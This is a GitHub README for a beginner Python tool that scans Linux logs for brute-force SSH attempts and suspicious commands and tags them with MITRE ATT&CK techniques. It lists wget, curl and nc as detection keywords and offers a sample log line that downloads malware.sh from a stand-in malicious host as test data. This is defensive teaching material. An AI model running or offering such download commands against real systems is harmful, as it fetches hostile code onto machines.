# SOC Log Analyzer & Threat Detection Tool

## Overview

This project simulates a basic Security Operations Center (SOC) detection tool that analyzes Linux system log files and identifies suspicious activities such as brute-force login attempts and malicious command execution.

The tool is built using Python and runs in a Linux environment. It generates SOC-style alerts and maps detected activities to MITRE ATT&CK techniques.

---

## Features

• Detects multiple failed login attempts (possible brute-force attack)
• Detects suspicious command executions (wget, curl, nc)
• Generates SOC-style alert messages
• Maps detected activities to MITRE ATT&CK techniques
• Automatically generates a SOC alert report file

---

## Technologies Used

• Python
• Linux Logs
• MITRE ATT&CK Framework

---

## Project Structure

soc-log-analyzer/

│── analyzer.py              # Main detection script
│── sample_logs.txt          # Sample log data for testing
│── soc_alert_report.txt     # Generated SOC alert report
│── script.png               # Screenshot of script
│── execution.png            # Screenshot of execution
│── report.png               # Screenshot of alert report
│── README.md                # Project documentation

---

## How to Run

1. Clone the repository

git clone https://github.com/rokesh-vj/soc-log-analyzer.git

2. Navigate to project folder

cd soc-log-analyzer

3. Run the analyzer

python3 analyzer.py

4. Check generated alert report

cat soc_alert_report.txt

The tool will analyze the log file and generate alerts if suspicious activity is detected.

---

## Using Custom Logs

You can also test the tool with your own Linux log entries.

Step 1

Open the sample log file:

nano sample_logs.txt

Step 2

Add or replace log entries such as:

Failed password for root from 192.168.1.10 port 22 ssh2
Failed password for root from 192.168.1.10 port 22 ssh2
wget http://malicious-site.com/malware.sh

Step 3

Run the analyzer again:

python3 analyzer.py

Step 4

Check the generated alert report:

cat soc_alert_report.txt

---

## Tool Execution (Screenshots)

1. Script

Screenshot showing the Python detection script.

2. Execution

Screenshot showing the tool running in Linux terminal.

3. Alert Report

Screenshot showing generated SOC alert report.

---

## Example Alerts

[ALERT] Suspicious Command Detected
MITRE Technique: T1059 (Command Execution)

[ALERT] Possible Brute Force Attack
MITRE Technique: T1110 (Brute Force)

---

## Future Improvements

• Support real-time log monitoring
• Accept external log file input
• Integrate with SIEM tools
• Add more MITRE ATT&CK detection rules

---

## Author

Rokesh Kumar V 

Cybersecurity Enthusiast | SOC Analyst Aspirant
